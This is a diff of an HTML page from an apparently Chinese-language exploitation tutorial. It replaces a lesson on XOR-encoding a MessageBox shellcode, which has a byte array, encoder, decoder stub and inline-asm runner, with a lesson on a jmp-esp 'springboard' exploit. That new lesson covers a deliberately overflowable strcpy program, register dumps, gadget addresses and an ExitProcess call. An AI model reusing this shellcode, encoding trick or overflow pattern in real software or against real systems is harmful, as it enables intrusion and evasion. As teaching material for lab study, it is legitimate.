@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>3.3Encode shellcode</title>
+<title>3.1Use springboard</title>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <style type="text/css">
 /* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
@@ -468,133 +468,99 @@ vertical-align:1px;
 </style>
 </head>
 <body>
-<h1 id="encode-shellcode">Encode shellcode</h1>
-<p><strong>Author：wnagzihxain<br>Mail：tudouboom@163.com</strong></p>
-<pre><code>#include &quot;stdio.h&quot;
+<h1 id="use-springboard">Use springboard</h1>
+<p><strong>Author：wnagzihxa1n<br>Mail：tudouboom@163.com</strong></p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#define PASSWORD &quot;1234567&quot;
 
-char popup_general[]=
-&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;
-&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;
-&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;
-&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;
-&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;
-&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;
-&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;
-&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;
-&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;
-&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;
-&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90&quot;;//shellcode should be ended with 0x90
-
-void encoder (char* input, unsigned char key, int display_flag)// bool display_flag
+int verify_password (char *password)
 {
-    int i = 0, len = 0;
+    int authenticated;
+    char buffer[44];
+    authenticated = strcmp(password, PASSWORD);
+    strcpy(buffer, password);//over flowed here!    
+    return authenticated;
+}
+
+int main()
+{
+    int valid_flag = 0;
+    char password[1024];
     FILE * fp;
-    unsigned char * output;
-    len = strlen(input);
-    output = (unsigned char *)malloc(len + 1);
-    if(!output)
+    LoadLibrary(&quot;user32.dll&quot;);//prepare for messagebox
+    if(!(fp = fopen(&quot;password.txt&quot;, &quot;rw+&quot;)))
     {
-        printf(&quot;memory erro!\n&quot;);
         exit(0);
     }
-    //encode the shellcode
-    for(i = 0; i &lt; len; i++)
+    fscanf(fp, &quot;%s&quot;, password);
+    valid_flag = verify_password(password);
+    if(valid_flag)
     {
-        output[i] = input[i] ^ key;
+        printf(&quot;incorrect password!\n&quot;);
     }
-    if(!(fp = fopen(&quot;encode.txt&quot;, &quot;w+&quot;)))
+    else
     {
-        printf(&quot;output file create erro&quot;);
-        exit(0);
+        printf(&quot;Congratulation! You have passed the verification!\n&quot;);
     }
-    fprintf(fp, &quot;\&quot;&quot;);
-    for(i = 0; i &lt; len; i++)
-    {        
-        fprintf(fp, &quot;\\x%0.2x&quot;, output[i]);
-        if((i + 1) % 16 == 0)
-        {            
-            fprintf(fp, &quot;\&quot;\n\&quot;&quot;);
-        }
-    }
-    fprintf(fp, &quot;\&quot;;&quot;);
     fclose(fp);
-    printf(&quot;dump the encoded shellcode to encode.txt OK!\n&quot;);
-    if(display_flag)//print to screen
-    {
-        for(i = 0; i &lt; len; i++)
-        {
-            printf(&quot;%0.2x &quot;, output[i]);
-            if((i + 1) % 16 == 0)
-            {
-                printf(&quot;\n&quot;);
-            }
-        }
-    }
-    free(output);
-}
-
-int main()
-{
-    encoder(popup_general, 0x44, 1);
-    getchar();
+    system(&quot;pause&quot;);
     return 0;
 }
-</code></pre><p>运行后</p>
-<pre><code>encoded shellcode (key=0x44):
-
-&quot;\xb8\x2c\x2e\x4e\x7c\x5a\x2c\x27\xcd\x95\x0b\x2c\x76\x30\xd5\x48&quot;
-&quot;\xcf\xb0\xc9\x3a\xb0\x77\x9f\xf3\x40\x6f\xa7\x22\xff\x77\x76\x17&quot;
-&quot;\x2c\x31\x37\x21\x36\x10\x77\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf&quot;
-&quot;\x0d\x58\xcf\x4d\xcf\x2d\x4c\xe9\x79\x2e\x4e\x7c\x5a\x31\x41\xd1&quot;
-&quot;\xbb\x13\xbc\xd1\x24\xcf\x01\x78\xcf\x08\x41\x3c\x47\x89\xcf\x1d&quot;
-&quot;\x64\x47\x99\x77\xbb\x03\xcf\x70\xff\x47\xb1\xdd\x4b\xfa\x42\x7e&quot;
-&quot;\x80\x30\x4c\x85\x8e\x43\x47\x94\x02\xaf\xb5\x7f\x10\x60\x58\x31&quot;
-&quot;\xa0\xcf\x1d\x60\x47\x99\x22\xcf\x78\x3f\xcf\x1d\x58\x47\x99\x47&quot;
-&quot;\x68\xff\xd1\x1b\xef\x13\x25\x79\x2e\x4e\x7c\x5a\x31\xed\x77\x9f&quot;
-&quot;\x17\x2c\x33\x21\x37\x30\x2c\x22\x25\x2d\x28\xcf\x80\x17\x14\x14&quot;
-&quot;\x17\xbb\x13\xb8\x17\xbb\x13\xbc\xd4&quot;;
-</code></pre><p>最后完整的代码</p>
-<pre><code>char final_sc_44[] = 
-&quot;\x83\xC0\x14&quot;          //ADD EAX,14
-&quot;\x33\xC9&quot;             //XOR ECX,ECX
-&quot;\x8A\x1C\x08&quot;           //MOV BL,BYTE PTR DS:[EAX+ECX]
-&quot;\x80\xF3\x44&quot;          //XOR BL,44   //notice 0x44 is taken as temp key to decode !
-&quot;\x88\x1C\x08&quot;           //MOV BYTE PTR DS:[EAX+ECX],BL
-&quot;\x41&quot;               //INC ECX
-&quot;\x80\xFB\x90&quot;          //CMP BL,90
-&quot;\x75\xF1&quot;            //JNZ SHORT decoder.00401034
-&quot;\xb8\x2c\x2e\x4e\x7c\x5a\x2c\x27\xcd\x95\x0b\x2c\x76\x30\xd5\x48&quot;
-&quot;\xcf\xb0\xc9\x3a\xb0\x77\x9f\xf3\x40\x6f\xa7\x22\xff\x77\x76\x17&quot;
-&quot;\x2c\x31\x37\x21\x36\x10\x77\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf&quot;
-&quot;\x0d\x58\xcf\x4d\xcf\x2d\x4c\xe9\x79\x2e\x4e\x7c\x5a\x31\x41\xd1&quot;
-&quot;\xbb\x13\xbc\xd1\x24\xcf\x01\x78\xcf\x08\x41\x3c\x47\x89\xcf\x1d&quot;
-&quot;\x64\x47\x99\x77\xbb\x03\xcf\x70\xff\x47\xb1\xdd\x4b\xfa\x42\x7e&quot;
-&quot;\x80\x30\x4c\x85\x8e\x43\x47\x94\x02\xaf\xb5\x7f\x10\x60\x58\x31&quot;
-&quot;\xa0\xcf\x1d\x60\x47\x99\x22\xcf\x78\x3f\xcf\x1d\x58\x47\x99\x47&quot;
-&quot;\x68\xff\xd1\x1b\xef\x13\x25\x79\x2e\x4e\x7c\x5a\x31\xed\x77\x9f&quot;
-&quot;\x17\x2c\x33\x21\x37\x30\x2c\x22\x25\x2d\x28\xcf\x80\x17\x14\x14&quot;
-&quot;\x17\xbb\x13\xb8\x17\xbb\x13\xbc\xd4&quot;;
-
-int main()
-{
-    __asm
-    {
-        lea eax, final_sc_44
-        push        eax
-        ret
-
-    }
-    return 0;
-}
-</code></pre><p>解释一下整个过程</p>
-<p>打注释的汇编是解码用的，对后面的乱七八糟的指令进行解码，你也可以载入OD看看，后面有部分是非法的，而其它也是不知道在表达什么</p>
+</code></pre><p>当输入11个<code>4321</code>，执行到retn的时候，可以看到ESP寄存器的值是<code>0x0012FB24</code></p>
 <p><img src="Image/1.png" alt=""></p>
-<p>我们来看看在OD里恢复真正的shellcode</p>
+<p>现在我们把输入的数字变成14个<code>4321</code></p>
+<p>虽然程序跳到了不知道什么地方的地方，然而ESP寄存器的值依旧是<code>0x0012FB28</code></p>
 <p><img src="Image/2.png" alt=""></p>
-<p>一路跳啊跳，来到这，可以看到这个就是shellcode头部解码语句，那我们就来运行几个循环先还原出部分代码</p>
+<p>寄存器的值，EBP被我们的数据覆盖掉了</p>
 <p><img src="Image/3.png" alt=""></p>
-<p>可以看到前面的已经还原出来了，但是这么多循环如果一个一个F8肯定很累，所以技巧来了，先还原出shellcode的第一句，确定第一句要完全还原，然后在还原出来的第一句下断点，然后F9，直接所有代码都还原了</p>
+<pre><code>EAX 31323334
+ECX 0012FBB4 ASCII CC,&quot;烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫&quot;
+EDX 00323334
+EBX 7FFDC000
+ESP 0012FB28
+EBP 31323334
+ESI 0012FB2C
+EDI 0012FF80
+EIP 00323334
+</code></pre><p>因为ESP寄存器在函数返回后不被溢出的数据干扰，看上面两次的测试就可以看出来，不管有没有溢出，函数返回后ESP寄存器的值都是<code>0x0012FB28</code></p>
+<p>这时候隆重来介绍一下<code>jmp esp</code>，简单来说呢，就是用这句汇编来覆盖返回地址，具体怎么做接下来慢慢讲</p>
+<p>首先用插件来搜索<code>jmp esp</code>，用现成的最好了，如果没有的去搜一下，<code>ollyuni.dll</code></p>
+<p>然后就可以用了</p>
 <p><img src="Image/4.png" alt=""></p>
+<p>搜一下<code>jmp esp</code>那个，当然中间会卡一下，卡完之后就可以点击<code>L</code>看信息了</p>
+<p><img src="Image/5.png" alt=""></p>
+<p>思来想去，决定选择<code>0x7FFA4512</code></p>
+<pre><code>0027762F   Location found: call esp in [unknown]
+00277A0D   Location found: call esp in [unknown]
+00277A17   Location found: call esp in [unknown]
+003010C8   Location found: call esp in [unknown]
+00305028   Location found: jmp esp in [unknown]
+00402166   Location found: jmp esp in stack_ov.text
+00429233   Location found: call esp in stack_ov.rdata
+7C8369C0   Location found: call esp in kernel32.text
+7C871613   Location found: call esp in kernel32.text
+7FFA4512   Location found: jmp esp in [unknown]
+7FFA54CD   Location found: jmp esp in [unknown]
+           11 addresses found, 0 filtered
+</code></pre><p>好了，有了这个之后就可以开始下面的工作了</p>
+<p>前面说到，程序在后面没有正常退出而是直接崩溃了，那么现在就来解决这个问题，方法也很简单，直接<code>exit</code>就好了</p>
+<p>同样利用Dependency Walker找到<code>kernel.dll</code>的基址和<code>ExitProcess</code>的偏移，然后找个计算器加起来</p>
+<pre><code>0x7C800000 + 0x0001D20A = 0x7C81D20A
+</code></pre><p><img src="Image/6.png" alt=""></p>
+<p>现在来准备password.txt</p>
+<p>我们大概的过程先是把buffer都给覆盖掉，然后返回地址覆盖上刚刚的<code>jmp esp</code>的内存地址，再往下就是shellcode</p>
+<p>行动！！！！！！</p>
+<p><img src="Image/7.png" alt=""></p>
+<p>其实呢，这个shellcode是有点问题的，为什么呢？</p>
+<p>这涉及到了截断的问题，B8 0A是一定会被截断的，所以……，往下看</p>
+<p>重新载入，运行起来</p>
+<p><img src="Image/8.png" alt=""></p>
+<p>的确是被截断了，后面那个00就是截断符，至于为什么后面再说，咱们这里先手动改一下</p>
+<pre><code>0012FB45    B8 0AD2817C     mov     eax,kernel32.ExitProcess
+0012FB4A    FFD0            call    eax
+</code></pre><p><img src="Image/9.png" alt=""></p>
+<p>然后继续运行，成功退出了：）</p>
 
 </body>
 </html>
